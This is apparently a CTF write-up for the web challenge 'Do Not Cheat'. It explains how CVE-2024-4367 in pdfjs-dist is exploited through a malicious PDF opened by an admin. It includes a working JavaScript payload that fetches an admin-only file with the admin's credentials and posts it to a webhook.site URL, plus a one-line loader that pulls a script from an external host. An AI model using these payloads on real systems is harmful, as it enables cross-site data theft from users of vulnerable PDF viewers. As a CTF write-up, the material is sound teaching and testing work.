# Do Not Cheat

🤥 Category: _WEB_  
🔗 Url: https://do-not-cheat-bb7d7982d597.1753ctf.com

---

## Discovery

The challenge hosts a website with a collection of cheatsheet PDFs. One file—the one containing the flag—is commented out from the visible list, indicating it is reserved for admin access. The site uses **pdfjs-dist@4.1.392** to display PDFs. This version is vulnerable to Arbitrary Code Injection (CVE-2024-4367), which can be confirmed by spotting the version information in the browser console. The vulnerability details are available on the Snyk website.

Furthermore, in the code there is a curious commented-out block that would normally enforce a strict same-origin policy for PDF files:

```js
//TODO: uncomment this when going to production, this is just because some files were not loading on localhost
/*if (fileOrigin !== viewerOrigin) { 
   throw new Error("file origin does not match viewer's");
}*/
```

This change relaxes domain checks, potentially allowing an attacker to load PDFs from different origins.

---

## Solution

By exploiting the vulnerability in pdfjs-dist, an attacker can craft a malicious PDF that executes JavaScript code when opened by an admin. The injected code fetches the admin-only flag PDF using the admin’s session, converts it into a base64 string, and exfiltrates it to an attacker-controlled webhook.

A working payload for this exploit is:

```js
(function(){
    // URL for the admin-only flag PDF
    const flagUrl = '/app/admin/flag.pdf';
    // Replace with your actual webhook URL
    const webhookUrl = 'https://webhook.site/.../recv';

    // Fetch the PDF with admin credentials
    fetch(flagUrl, { credentials: 'include' })
      .then(response => response.blob())
      .then(blob => {
          // Convert the PDF blob to a base64 string
          const reader = new FileReader();
          reader.onloadend = function() {
              const pdfData = reader.result; // Data URL string (base64 encoded)
              // Send the PDF data to your webhook
              fetch(webhookUrl, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({ pdf: pdfData })
              });
          };
          reader.readAsDataURL(blob);
      })
      .catch(console.error);
})();
```

This payload can be embedded into a malicious PDF generated with tools like the PoC from [CVE-2024-4367-PoC](https://github.com/LOURC0D3/CVE-2024-4367-PoC).

It was not originally working with my POC, most likely because the code was either too long or contained some incompatible characters, but I've created a short loader script:

```js
var s=document.createElement('script');s.src='https://webhook.site/...';document.body.append(s)
```

To load the script for me from external source.

Malicious PDF was put online on the site that had CORS headers set to allow downloading it using fetch from any site.
Then I just needed to craft a link that would make an admin open malicious PDF.

https://do-not-cheat-bb7d7982d597.1753ctf.com/report?document=http://some-site.com/poc.pdf

After a moment I could read PDF bytes from webhook.site, and converting it to PDF I got the file with the flag